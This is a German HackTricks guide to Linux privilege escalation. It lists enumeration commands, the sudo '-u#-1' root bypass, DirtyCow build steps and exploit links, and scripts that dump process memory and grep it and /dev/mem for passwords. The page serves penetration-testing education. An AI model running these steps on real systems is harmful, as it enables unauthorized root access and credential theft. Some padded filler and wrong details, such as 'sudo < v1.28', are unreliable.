# Linux Privilege Escalation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Systeminformationen

### OS-Informationen

Lassen Sie uns etwas Wissen über das Betriebssystem gewinnen, das ausgeführt wird.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibberechtigungen für einen beliebigen Ordner innerhalb der `PATH`-Variable** haben, können Sie möglicherweise einige Bibliotheken oder Binärdateien übernehmen:
```bash
echo $PATH
```
### Umgebungsinfo

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfen Sie die Kernel-Version und ob es einen Exploit gibt, der zur Eskalation von Privilegien verwendet werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Eine gute Liste von anfälligen Kerneln und bereits **kompilierten Exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Andere Websites, auf denen du einige **kompilierte Exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle anfälligen Kernelversionen von dieser Website zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen könnten, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (nur auf dem Opfer ausführen, überprüft nur Exploits für Kernel 2.x)

Suchen Sie immer die Kernel-Version in Google, vielleicht ist Ihre Kernel-Version in einem Kernel-Exploit erwähnt und dann können Sie sicher sein, dass dieser Exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux-Privileg-Eskalation - Linux-Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in:
```bash
searchsploit sudo
```
Sie können überprüfen, ob die sudo-Version anfällig ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov

Sudo ist ein leistungsstarkes Werkzeug, das auf Linux-Systemen verwendet wird, um Benutzern die Ausführung von Befehlen mit den Berechtigungen eines anderen Benutzers zu ermöglichen. Es wird häufig verwendet, um privilegierte Aktionen auszuführen, z. B. das Installieren von Software oder das Ändern von Systemkonfigurationen.

In Versionen von sudo vor 1.28 gibt es eine Schwachstelle, die es einem Angreifer ermöglicht, seine Berechtigungen zu eskalieren und Root-Zugriff auf dem System zu erlangen. Diese Schwachstelle wird durch eine fehlerhafte Überprüfung der Befehlszeilenargumente verursacht.

Ein Angreifer kann diese Schwachstelle ausnutzen, indem er ein speziell formatiertes Befehlszeilenargument verwendet, das von sudo nicht ordnungsgemäß überprüft wird. Dadurch kann der Angreifer Befehle mit erhöhten Berechtigungen ausführen und letztendlich Root-Zugriff auf dem System erlangen.

Um diese Schwachstelle zu beheben, sollten Benutzer auf eine Version von sudo aktualisieren, die 1.28 oder höher ist. Es wird empfohlen, regelmäßig nach Updates zu suchen und diese so schnell wie möglich zu installieren, um die Sicherheit des Systems zu gewährleisten.
```
sudo -u#-1 /bin/bash
```
### Überprüfung der Dmesg-Signatur fehlgeschlagen

Überprüfen Sie die **smasher2-Box von HTB** für ein **Beispiel**, wie diese Schwachstelle ausgenutzt werden kann.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemenumerierung

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about a target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

Process enumeration involves listing all running processes on the system. This can be done using commands like `ps`, `top`, or `htop`. By examining the list of processes, you can identify any suspicious or unusual processes that may indicate a compromise or privilege escalation possibility.

#### 2. Service Enumeration

Service enumeration involves identifying all the services running on the system. This can be done using commands like `netstat`, `ss`, or `lsof`. By analyzing the list of services, you can identify any open ports or listening services that may be vulnerable to exploitation.

#### 3. File and Directory Enumeration

File and directory enumeration involves listing all the files and directories on the system. This can be done using commands like `ls`, `find`, or `tree`. By examining the file system, you can identify any sensitive files or directories that may contain valuable information or configuration details.

#### 4. Network Enumeration

Network enumeration involves gathering information about the network interfaces and connections on the system. This can be done using commands like `ifconfig`, `ip`, or `netstat`. By analyzing the network configuration, you can identify any potential network-based vulnerabilities or misconfigurations.

#### 5. User and Group Enumeration

User and group enumeration involves listing all the users and groups on the system. This can be done using commands like `id`, `cat /etc/passwd`, or `getent`. By examining the user and group information, you can identify any privileged accounts or misconfigured permissions that may lead to privilege escalation.

#### 6. Scheduled Tasks Enumeration

Scheduled tasks enumeration involves listing all the scheduled tasks or cron jobs on the system. This can be done using commands like `crontab -l`, `ls /etc/cron*`, or `systemctl list-timers`. By examining the scheduled tasks, you can identify any tasks that are running with elevated privileges or executing potentially malicious commands.

By performing these additional system enumeration techniques, you can gather more information about the target system and increase your chances of finding vulnerabilities or privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### AppArmor

AppArmor ist ein Sicherheitsframework für Linux, das dazu dient, Anwendungen in einer isolierten Umgebung auszuführen und deren Zugriff auf das System zu beschränken. Es ermöglicht die Definition von Richtlinien, die festlegen, welche Ressourcen eine Anwendung verwenden darf und welche nicht. Durch die Verwendung von AppArmor können potenzielle Angriffe durch das Ausnutzen von Schwachstellen in Anwendungen erschwert werden.

### SELinux

SELinux (Security-Enhanced Linux) ist ein Sicherheitsmechanismus für Linux, der zusätzliche Sicherheitsrichtlinien implementiert. Es erweitert die standardmäßigen Zugriffskontrollen des Linux-Kernels und ermöglicht eine granulare Kontrolle über die Berechtigungen von Prozessen und Dateien. Durch die Verwendung von SELinux können potenzielle Angriffe durch das Ausnutzen von Schwachstellen in Anwendungen erschwert werden.

### Grsecurity/PaX

Grsecurity/PaX ist eine Sammlung von Sicherheitspatches für den Linux-Kernel, die zusätzliche Schutzmechanismen implementieren. Diese Patches bieten Funktionen wie Address Space Layout Randomization (ASLR), Executable Space Protection (ESP) und Stack Smashing Protection (SSP). Durch die Verwendung von Grsecurity/PaX können potenzielle Angriffe durch das Ausnutzen von Schwachstellen im Kernel oder in Anwendungen erschwert werden.

### Kernel Hardening

Kernel Hardening bezieht sich auf verschiedene Techniken und Patches, die darauf abzielen, den Linux-Kernel vor Angriffen zu schützen. Dazu gehören das Aktivieren von Sicherheitsfunktionen wie Address Space Layout Randomization (ASLR), Executable Space Protection (ESP) und Stack Smashing Protection (SSP). Durch die Anwendung von Kernel Hardening-Techniken können potenzielle Angriffe durch das Ausnutzen von Schwachstellen im Kernel erschwert werden.

### Mandatory Access Control (MAC)

Mandatory Access Control (MAC) ist ein Sicherheitsmechanismus, der zusätzliche Zugriffskontrollen auf Systemebene implementiert. Es ermöglicht die Definition von Richtlinien, die festlegen, welche Aktionen ein Prozess ausführen darf und welche nicht. Durch die Verwendung von MAC können potenzielle Angriffe durch das Ausnutzen von Schwachstellen in Anwendungen oder im Betriebssystem erschwert werden.

### Secure Boot

Secure Boot ist ein Sicherheitsmechanismus, der sicherstellt, dass nur vertrauenswürdige Software während des Bootvorgangs geladen wird. Es verwendet digitale Signaturen, um sicherzustellen, dass der Bootloader und der Kernel nicht manipuliert wurden. Durch die Verwendung von Secure Boot können potenzielle Angriffe durch das Ausnutzen von Schwachstellen im Bootprozess erschwert werden.

### Firewall

Eine Firewall ist eine Sicherheitsvorrichtung, die den Datenverkehr zwischen einem internen Netzwerk und einem externen Netzwerk überwacht und filtert. Sie kann verwendet werden, um den Zugriff auf bestimmte Ports oder Dienste zu beschränken und potenzielle Angriffe abzuwehren. Durch die Verwendung einer Firewall können potenzielle Angriffe durch das Ausnutzen von Schwachstellen in Netzwerkdiensten erschwert werden.

### Intrusion Detection/Prevention System (IDS/IPS)

Ein Intrusion Detection/Prevention System (IDS/IPS) ist eine Sicherheitsvorrichtung, die den Netzwerkverkehr überwacht und nach Anzeichen von Angriffen sucht. Es kann verwendet werden, um verdächtigen Datenverkehr zu erkennen und zu blockieren, um potenzielle Angriffe abzuwehren. Durch die Verwendung eines IDS/IPS können potenzielle Angriffe durch das Ausnutzen von Schwachstellen in Netzwerkdiensten erschwert werden.

### System Logging

System Logging bezieht sich auf die Protokollierung von Ereignissen und Aktivitäten auf einem System. Durch die Protokollierung von Ereignissen können potenzielle Angriffe erkannt und analysiert werden. Es ermöglicht auch die Überwachung von Systemaktivitäten und die Identifizierung von Sicherheitsvorfällen. Durch die Verwendung von System Logging können potenzielle Angriffe erschwert werden, da verdächtige Aktivitäten erkannt und darauf reagiert werden können.

### Patch Management

Patch Management bezieht sich auf den Prozess der Aktualisierung von Software und Betriebssystemen, um bekannte Schwachstellen zu beheben. Durch regelmäßige Patch-Updates können potenzielle Angriffe durch das Ausnutzen von bekannten Schwachstellen erschwert werden. Es ist wichtig, dass Patch-Updates zeitnah durchgeführt werden, um die Sicherheit des Systems zu gewährleisten.

### User Account Management

Das User Account Management bezieht sich auf die Verwaltung von Benutzerkonten auf einem System. Es umfasst die Erstellung, Aktualisierung und Löschung von Benutzerkonten sowie die Zuweisung von Berechtigungen. Durch eine effektive Verwaltung von Benutzerkonten können potenzielle Angriffe durch das Ausnutzen von unsicheren oder nicht verwendeten Konten erschwert werden. Es ist wichtig, dass Benutzerkonten regelmäßig überprüft und Berechtigungen angemessen zugewiesen werden.

### Least Privilege Principle

Das Least Privilege Principle (Prinzip des geringsten Privilegs) besagt, dass Benutzer nur die Berechtigungen erhalten sollten, die sie für ihre Aufgaben benötigen. Durch die Anwendung dieses Prinzips können potenzielle Angriffe durch das Ausnutzen von übermäßigen Berechtigungen erschwert werden. Es ist wichtig, dass Berechtigungen regelmäßig überprüft und auf das Minimum reduziert werden, um die Sicherheit des Systems zu gewährleisten.

### Strong Password Policies

Starke Passwortrichtlinien beziehen sich auf die Festlegung von Anforderungen für die Erstellung und Verwendung von Passwörtern. Durch die Verwendung von starken Passwörtern können potenzielle Angriffe durch das Ausnutzen von schwachen oder leicht zu erratenden Passwörtern erschwert werden. Es ist wichtig, dass Passwortrichtlinien implementiert werden, die komplexe Passwörter erfordern und regelmäßige Passwortänderungen fördern.

### Encryption

Die Verschlüsselung bezieht sich auf die Umwandlung von Daten in eine unleserliche Form, um sie vor unbefugtem Zugriff zu schützen. Durch die Verwendung von Verschlüsselung können potenzielle Angriffe durch das Ausnutzen von Datenlecks oder dem Abfangen von Datenpaketen erschwert werden. Es ist wichtig, dass sensible Daten verschlüsselt werden, insbesondere während der Übertragung und Speicherung.

### Security Awareness Training

Das Security Awareness Training bezieht sich auf die Schulung von Benutzern in Bezug auf Sicherheitsbewusstsein und Best Practices. Durch Schulungen können Benutzer über potenzielle Bedrohungen und Angriffstechniken informiert werden. Es ist wichtig, dass Benutzer regelmäßig geschult werden, um das Sicherheitsbewusstsein zu stärken und potenzielle Angriffe zu erkennen und zu verhindern.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity ist ein Sicherheitspaket für den Linux-Kernel, das zusätzliche Schutzmechanismen bietet, um die Sicherheit des Systems zu erhöhen. Es implementiert verschiedene Funktionen wie RBAC (Role-Based Access Control), Sandboxing und Exploit-Mitigationstechniken, um die Auswirkungen von Sicherheitslücken zu minimieren.

Grsecurity kann dazu beitragen, die Privilegien-Eskalation auf einem Linux-System zu erschweren, indem es die Angriffsfläche reduziert und die Ausnutzung von Schwachstellen erschwert. Es bietet eine granulare Kontrolle über die Zugriffsrechte von Benutzern und Prozessen, wodurch unautorisierte Zugriffe und Privilegien-Eskalationen verhindert werden können.

Einige der Funktionen von Grsecurity umfassen:

- **RBAC**: Grsecurity implementiert ein Rollenbasiertes Zugriffskontrollsystem, das die Zugriffsrechte von Benutzern und Prozessen basierend auf ihren Rollen und Berechtigungen verwaltet. Dadurch können privilegierte Operationen eingeschränkt und unautorisierte Zugriffe verhindert werden.

- **Sandboxing**: Grsecurity ermöglicht das Erstellen von isolierten Umgebungen für Prozesse, um die Auswirkungen von Angriffen zu begrenzen. Durch die Verwendung von Sandboxen können bösartige Prozesse eingeschränkt und die Ausbreitung von Schadcode verhindert werden.

- **Exploit-Mitigation**: Grsecurity implementiert verschiedene Techniken zur Reduzierung der Auswirkungen von Exploits. Dazu gehören Address Space Layout Randomization (ASLR), das die Vorhersagbarkeit von Speicheradressen erschwert, und Executable Space Protection (ESR), das das Ausführen von Code in bestimmten Speicherbereichen verhindert.

Die Verwendung von Grsecurity kann die Sicherheit eines Linux-Systems erheblich verbessern, indem es zusätzliche Schutzmechanismen implementiert und die Auswirkungen von Sicherheitslücken minimiert. Es ist jedoch wichtig zu beachten, dass die Konfiguration und Verwaltung von Grsecurity sorgfältig durchgeführt werden muss, um sicherzustellen, dass das System ordnungsgemäß geschützt ist.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX is a patch for the Linux kernel that provides various security enhancements, including protection against memory corruption vulnerabilities. It works by implementing several security features, such as Address Space Layout Randomization (ASLR), Non-Executable Pages (NX), and Stack Smashing Protection (SSP).

PaX can be an effective tool for hardening a Linux system against privilege escalation attacks. By enabling PaX, you can mitigate the risk of attackers exploiting vulnerabilities to gain elevated privileges.

To enable PaX on your Linux system, you need to compile and install a PaX-enabled kernel. This involves patching the kernel source code with the PaX patch and then compiling and installing the patched kernel.

Once PaX is enabled, it provides additional protection mechanisms that make it more difficult for attackers to exploit vulnerabilities. For example, ASLR randomizes the memory layout of processes, making it harder for attackers to predict the location of critical data structures. NX prevents the execution of code on pages marked as non-executable, reducing the risk of buffer overflow attacks. SSP adds additional checks to detect and prevent stack-based buffer overflows.

While PaX can significantly enhance the security of a Linux system, it is important to note that it is not a silver bullet. It is just one layer of defense and should be used in conjunction with other security measures, such as regular patching, strong access controls, and secure coding practices.

By implementing PaX and following other best practices for Linux hardening, you can reduce the risk of privilege escalation attacks and enhance the overall security of your system.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield ist eine Sicherheitsfunktion, die in einigen Linux-Distributionen implementiert ist, um die Ausführung von schädlichem Code zu verhindern. Es verwendet verschiedene Techniken, um die Ausführung von Code in bestimmten Speicherbereichen zu blockieren oder einzuschränken.

Eine der Hauptfunktionen von Execshield ist die Randomisierung des Speicherlayouts. Dadurch wird es schwieriger für Angreifer, gezielte Angriffe durchzuführen, da sie nicht vorhersagen können, wo sich bestimmte Funktionen oder Daten im Speicher befinden.

Darüber hinaus verwendet Execshield auch Techniken wie die Stack-Schutzvorrichtung (Stack Guard) und die Adressraumlayout-Zufälligkeit (ASLR), um die Sicherheit weiter zu verbessern. Stack Guard schützt vor Pufferüberläufen, indem es den Stack vor Überschreibungen schützt, während ASLR die Adressen von Speicherbereichen zufällig verschiebt, um die Ausnutzung von Sicherheitslücken zu erschweren.

Execshield ist eine effektive Maßnahme zur Härtung von Linux-Systemen und zur Verhinderung von Privilege Escalation-Angriffen. Es wird empfohlen, diese Funktion zu aktivieren, um die Sicherheit Ihres Systems zu verbessern.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) ist ein Sicherheitsmechanismus für Linux-Betriebssysteme, der zusätzlichen Schutz vor unbefugtem Zugriff bietet. Es implementiert eine mandatorische Zugriffskontrolle (MAC), die die Berechtigungen für Prozesse, Dateien und andere Systemressourcen einschränkt.

SElinux verwendet Sicherheitsrichtlinien, um den Zugriff auf Ressourcen zu steuern. Diese Richtlinien definieren, welche Aktionen ein Prozess ausführen darf und welche Dateien und Verzeichnisse er lesen, schreiben oder ausführen kann. Durch die Einschränkung der Berechtigungen können potenzielle Angriffe und Privilegieneskalationen verhindert werden.

SElinux bietet verschiedene Modi, darunter den enforcing-Modus, in dem die Sicherheitsrichtlinien strikt durchgesetzt werden, und den permissive-Modus, der Verstöße gegen die Richtlinien protokolliert, aber nicht blockiert. Es ist wichtig zu beachten, dass SElinux eine zusätzliche Sicherheitsebene darstellt und nicht als Ersatz für andere Sicherheitsmaßnahmen betrachtet werden sollte.

Um SElinux zu konfigurieren, können Sie die Datei `/etc/selinux/config` bearbeiten. Hier können Sie den Modus (enforcing, permissive oder disabled) festlegen und die Sicherheitsrichtlinie auswählen. Nach der Konfiguration müssen Sie das System neu starten, damit die Änderungen wirksam werden.

SElinux ist ein leistungsstarkes Werkzeug zur Stärkung der Sicherheit von Linux-Systemen. Durch die Implementierung von MAC und die Einschränkung von Berechtigungen trägt es dazu bei, potenzielle Schwachstellen zu minimieren und die Integrität des Systems zu schützen.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) ist eine Sicherheitsfunktion, die in Betriebssystemen implementiert ist, um die Ausnutzung von Sicherheitslücken zu erschweren. ASLR verschiebt die Speicheradressen von Systemkomponenten und Bibliotheken zufällig, wodurch es schwieriger wird, gezielte Angriffe durchzuführen.

ASLR kann die Privilegieneskalation erschweren, da Angreifer nicht vorhersagen können, wo bestimmte Funktionen oder Daten im Speicher liegen. Dadurch wird es schwieriger, gezielte Angriffe durchzuführen, da der Angreifer nicht genau weiß, wo er im Speicher suchen muss.

ASLR kann auf verschiedenen Ebenen implementiert werden, einschließlich des Kernels, der Bibliotheken und der ausführbaren Dateien. Es ist wichtig zu beachten, dass ASLR allein nicht ausreicht, um Sicherheitslücken zu verhindern, sondern nur eine zusätzliche Sicherheitsebene darstellt. Es ist ratsam, ASLR in Kombination mit anderen Sicherheitsmaßnahmen zu verwenden, um die Sicherheit des Systems zu verbessern.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker-Breakout

Wenn Sie sich innerhalb eines Docker-Containers befinden, können Sie versuchen, daraus auszubrechen:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Laufwerke

Überprüfen Sie, **was eingebunden und nicht eingebunden ist**, wo und warum. Wenn etwas nicht eingebunden ist, können Sie versuchen, es einzubinden und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Ermittle nützliche Binärdateien
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Überprüfen Sie auch, ob **ein Compiler installiert ist**. Dies ist nützlich, wenn Sie einen Kernel-Exploit verwenden müssen, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der Sie ihn verwenden möchten (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfen Sie die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Version von Nagios (zum Beispiel), die für die Eskalation von Privilegien ausgenutzt werden könnte...\
Es wird empfohlen, manuell die Version der verdächtigsten installierten Software zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn Sie SSH-Zugriff auf die Maschine haben, können Sie auch **openVAS** verwenden, um nach veralteter und anfälliger Software zu suchen, die auf der Maschine installiert ist.

{% hint style="info" %}
_Beachten Sie, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sein werden. Daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die überprüfen, ob eine installierte Softwareversion anfällig für bekannte Exploits ist._
{% endhint %}

## Prozesse

Werfen Sie einen Blick auf **die ausgeführten Prozesse** und prüfen Sie, ob ein Prozess **mehr Berechtigungen hat, als er sollte** (vielleicht wird ein Tomcat von root ausgeführt?).
```bash
ps aux
ps -ef
top -n 1
```
Immer nach möglichen [**electron/cef/chromium Debuggern** suchen, die ausgeführt werden. Sie können sie missbrauchen, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Befehlszeile des Prozesses überprüft.\
Überprüfen Sie auch **Ihre Berechtigungen für die Prozessbinaries**, vielleicht können Sie jemanden überschreiben.

### Prozessüberwachung

Sie können Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Dies kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn eine Reihe von Anforderungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **Anmeldeinformationen im Klartext im Speicher**.\
Normalerweise benötigen Sie **Root-Berechtigungen**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören. Daher ist dies in der Regel nützlicher, wenn Sie bereits Root-Zugriff haben und weitere Anmeldeinformationen entdecken möchten.\
Beachten Sie jedoch, dass **Sie als regulärer Benutzer den Speicher der Prozesse lesen können, die Ihnen gehören**.

{% hint style="warning" %}
Beachten Sie, dass heutzutage die meisten Maschinen **ptrace standardmäßig nicht zulassen**, was bedeutet, dass Sie keine anderen Prozesse dumpen können, die Ihrem unprivilegierten Benutzer gehören.

Die Datei _**/proc/sys/kernel/yama/ptrace\_scope**_ steuert die Zugänglichkeit von ptrace:

* **kernel.yama.ptrace\_scope = 0**: Alle Prozesse können debuggt werden, solange sie die gleiche UID haben. So funktionierte das klassische Tracing.
* **kernel.yama.ptrace\_scope = 1**: Nur ein übergeordneter Prozess kann debuggt werden.
* **kernel.yama.ptrace\_scope = 2**: Nur der Administrator kann ptrace verwenden, da dies die CAP\_SYS\_PTRACE-Fähigkeit erfordert.
* **kernel.yama.ptrace\_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Neustart erforderlich, um das Tracing wieder zu aktivieren.
{% endhint %}

#### GDB

Wenn Sie Zugriff auf den Speicher eines FTP-Dienstes haben (zum Beispiel), können Sie den Heap abrufen und darin nach Anmeldeinformationen suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigt **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; es zeigt auch die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** stellt den **Speicher des Prozesses selbst** zur Verfügung. Aus der **maps**-Datei wissen wir, welche **Speicherregionen lesbar sind** und ihre Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu suchen und alle lesbaren Regionen** in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über `/dev/kmem` zugegriffen werden.\
Normalerweise ist `/dev/mem` nur lesbar für den Benutzer **root** und die Gruppe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Linux-Neuinterpretation des klassischen ProcDump-Tools aus der Sysinternals-Suite von Windows-Tools. Holen Sie es sich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, können Sie Folgendes verwenden:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die Root-Anforderungen entfernen und den von Ihnen besessenen Prozess dumpen
* Skript A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (Root ist erforderlich)

### Anmeldeinformationen aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der Authentifizierungsprozess ausgeführt wird:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Sie können den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und nach Anmeldedaten im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **klartextbasierte Anmeldeinformationen aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es erfordert Root-Rechte, um ordnungsgemäß zu funktionieren.

| Funktion                                           | Prozessname         |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktive FTP-Verbindungen)                   | vsftpd               |
| Apache2 (Aktive HTTP Basic Auth-Sitzungen)         | apache2              |
| OpenSSH (Aktive SSH-Sitzungen - Sudo-Nutzung)        | sshd:                |

#### Suche nach Regex/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
